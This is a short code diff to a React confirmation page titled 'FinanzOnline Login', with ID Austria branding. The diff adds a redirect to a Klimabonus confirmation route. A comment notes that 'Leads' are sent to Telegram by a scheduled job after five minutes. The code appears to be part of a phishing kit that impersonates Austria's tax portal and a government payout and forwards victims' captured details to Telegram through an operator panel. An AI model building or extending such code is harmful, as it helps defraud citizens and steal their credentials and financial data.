@@ -1,7 +1,9 @@
 import { useEffect } from "react";
+import { Navigate, useLocation } from "react-router-dom";
 import Header from "@/components/Header";
 import { usePageMeta } from "@/hooks/use-page-meta";
 import { CheckCircle, Check } from "lucide-react";
+import { usePanel } from "@/components/PanelProvider";
 
 import idAustriaImg from "@/assets/IDAustria.png";
 import finanznaviImg from "@/assets/Finanznavi.jpg";
@@ -19,8 +21,16 @@ const confirmationItems = [
 ];
 
 const Confirmation = () => {
+  const { type } = usePanel();
+  const location = useLocation();
   usePageMeta("FinanzOnline Login", "/favicon.png");
   useEffect(() => { window.scrollTo(0, 0); }, []);
+
+  if (type === "klimabonus") {
+    return <Navigate to={`/klimabonus/bestaetigung${location.search}`} replace />;
+  }
+
+
 
   // Telegram-Versand wird ausschließlich vom pg_cron Job nach 5 Minuten erledigt.
   // So bekommen Leads Zeit, vom Full Info zum Log zu werden, bevor gesendet wird.
